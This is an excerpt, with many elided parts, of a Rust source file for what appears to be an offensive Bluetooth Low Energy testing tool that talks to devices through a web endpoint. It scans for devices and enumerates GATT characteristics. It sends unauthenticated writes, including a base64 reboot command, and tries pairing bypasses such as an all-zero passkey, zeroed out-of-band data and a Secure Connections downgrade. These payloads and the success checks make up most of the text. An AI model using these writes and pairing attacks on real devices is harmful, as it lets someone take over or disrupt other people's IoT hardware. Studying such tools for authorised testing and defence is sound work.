...
pub async fn scan(url: &str, timeout: u64) -> anyhow::Result<()> {
    ...
    match client.post(url).json(&body).send().await {
        Ok(resp) => {
            ...
            let has_devices =
                text.contains("device") || text.contains("addr") || text.contains("mac");
            let tag = if has_devices {
                "DEVICES FOUND".red().bold().to_string()
            } else {
    ...
    println!(
        "\n  {} Common BLE device types to look for:",
        "[*]".cyan().bold()
    );
...
pub async fn gatt(url: &str, timeout: u64) -> anyhow::Result<()> {
    ...
    for (name, uuid) in &services {
        ...
        match client.post(url).json(&body).send().await {
            Ok(resp) => {
                let status = resp.status().as_u16();
                let text = resp.text().await.unwrap_or_default();
                let has_chars = text.contains("characteristic")
                    || text.contains("uuid")
                    || text.contains("value");
                let tag = if has_chars {
                    "CHARACTERISTICS".red().bold().to_string()
                } else {
                    format!("status={}", status)
                };
    ...
    let dangerous_chars = [
        ...
        (
            ...
            "Fire-and-forget writes — no ACK needed",
        ),
        (
            "Notify/Indicate",
            "Server pushes data — potential data leak",
        ),
    ...
    println!(
        "\n  {} Dangerous characteristic types:",
        "[*]".cyan().bold()
    );
...
pub async fn write_test(url: &str, timeout: u64) -> anyhow::Result<()> {
    ...
    let write_chars = [
        (
            "Write command",
            serde_json::json!({"action": "ble_write", "char_uuid": "0000ffe1-0000-1000-8000-00805f9b34fb", "value": "AA==", "response": false}),
        ),
        (
            "Write request",
            serde_json::json!({"action": "ble_write", "char_uuid": "0000ffe1-0000-1000-8000-00805f9b34fb", "value": "AA==", "response": true}),
        ),
        (
            "Long write",
            serde_json::json!({"action": "ble_write", "char_uuid": "0000ffe1-0000-1000-8000-00805f9b34fb", "value": "AAAAAA==", "response": true}),
        ),
        (
            "Reboot cmd",
            serde_json::json!({"action": "ble_write", "char_uuid": "0000ffe1-0000-1000-8000-00805f9b34fb", "value": "cmVib290", "response": false}),
        ),
        (
            "Config write",
            serde_json::json!({"action": "ble_write", "char_uuid": "00001802-0000-1000-8000-00805f9b34fb", "value": "dGVzdA==", "response": false}),
        ),
    ];
    ...
    println!(
        "\n{} Unauthenticated BLE writes can manipulate IoT devices.",
        "[*]".cyan().bold()
    );
    Ok(())
}
...
pub async fn mitm(url: &str, timeout: u64) -> anyhow::Result<()> {
    ...
    let pairing_tests = [
        (
            "Just Works pairing",
            serde_json::json!({"action": "ble_pair", "method": "just_works"}),
        ),
        (
            "Passkey bypass",
            serde_json::json!({"action": "ble_pair", "method": "passkey", "passkey": "000000"}),
        ),
        (
            "Numeric comparison bypass",
            serde_json::json!({"action": "ble_pair", "method": "numeric", "confirm": true}),
        ),
        (
            "OOB bypass",
            serde_json::json!({"action": "ble_pair", "method": "oob", "oob_data": "00000000000000000000000000000000"}),
        ),
        (
            "Legacy pairing",
            serde_json::json!({"action": "ble_pair", "method": "legacy"}),
        ),
        (
            "Secure Connections downgrade",
            serde_json::json!({"action": "ble_pair", "method": "downgrade"}),
        ),
    ];
        ...
        match client.post(url).json(&body).send().await {
            Ok(resp) => {
                ...
                let paired = text.contains("paired")
                    ...
                    || text.contains("bonded")
                    || status == 200;
                let tag = if paired {
                    "PAIRED".red().bold().to_string()
                } else {
                    format!("status={}", status)
                };
    ...
    println!(
        "\n{} 'Just Works' pairing has no authentication — relay attack trivial.",
        "[*]".cyan().bold()
    );
    Ok(())
}
